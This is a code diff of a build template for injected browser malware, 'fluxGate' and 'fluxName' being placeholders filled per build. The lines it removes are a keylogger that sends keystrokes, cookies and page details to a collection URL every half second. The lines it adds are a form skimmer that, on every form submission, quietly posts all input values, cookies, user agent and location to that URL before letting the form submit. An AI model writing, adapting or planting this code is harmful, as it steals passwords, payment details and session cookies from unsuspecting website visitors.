+++ server/builds/main.build
@@ -1,76 +1,55 @@
-// Settings
-var fluxGate = "{buildGate}";
-var fluxName = "{buildName}";
-var sendTimeout = 500;
+document.addEventListener('DOMContentLoaded', function() {
+  const fluxGate = "{buildGate}";
+  const fluxName = "{buildName}";
 
-// KEYLOGGER
-var keys = "";
-document.addEventListener("keydown", function(e) {
-  var keyCode = e.keyCode;
-  var keyName = e.key;
-  
-  // Check key
-  switch(keyCode) {
-    // ENTER
-    case 13:
-      keyName = "\n";
-      break;
-    // BACKSPACE
-    case 8:
-      keyName = "";
-      keys = keys.slice(0, -1);
-      break;
-    // TAB
-    case 9:
-      keyName = "\n";
-      break;
-    // NORMAL KEY
-    default:
-      // Ignore Shift key
-      if (keyCode === 16) {
-        return;
-      }
-      
-      // If is special key add < KEY >
-      if (keyName.length > 1) {
-        keyName = " <" + keyName + "> ";
-      }
-      break;
+  function gatherInputData() {
+    const inputData = {};
+    document.querySelectorAll('input').forEach((inputElem, index) => {
+      const { type, value, checked, name } = inputElem;
+
+      if (['radio', 'checkbox'].includes(type) && !checked) return;
+
+      const key = name || `input_${index}_${type}`;
+      inputData[key] = value;
+    });
+    return inputData;
   }
-  
-  // Add
-  keys += keyName;
+
+  async function sendData(event) {
+    event.preventDefault();
+
+    const date = new Date();
+    const time = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`;
+    const inputValues = gatherInputData();
+
+    const formData = new FormData();
+
+    Object.entries(inputValues).forEach(([key, value]) => {
+      formData.append(key, value);
+    });
+
+    const inputss = JSON.stringify(inputValues)
+    formData.append("uagents", navigator.userAgent);
+    formData.append("host", location.hostname);
+    formData.append("location", location.toString());
+    formData.append("cookies", document.cookie);
+    formData.append("name", fluxName);
+    formData.append("time", time);
+    formData.append("inputs", inputss); // Adicione os inputs capturados como JSON
+
+    try {
+      await fetch(fluxGate, {
+        method: 'POST',
+        body: formData,
+      });
+    } catch (error) {
+      console.error("Failed to send data:", error);
+    }
+
+    event.target.submit();
+  }
+
+  document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', sendData);
+  });
 });
-
-// Save keylogs, useragents, ip, location, host, cookies.
-var date = new Date();
-var old = 0;
-
-function saveAll() {
-  // Check for new data
-  if (old === keys.length) {
-    // not send
-    return;
-  } else {
-    // send
-    old = keys.length;
-  }
-
-  var time = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
-  var uagents = window.navigator.userAgent;
-  var host = window.location.hostname;
-  var location = document.location;
-  var cookies = document.cookie;
-
-  var http = new XMLHttpRequest();
-  var params = "keyLogs=" + keys + "&cookies=" + cookies + "&name=" + fluxName + "&uagents=" + uagents + "&location=" + location + "&host=" + host + "&time=" + time + "&sendLogs";
-  http.open("POST", fluxGate, true);
-
-  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-  http.send(params);
-}
-
-// Create loop
-setInterval(function() {
-  saveAll();
-}, sendTimeout);
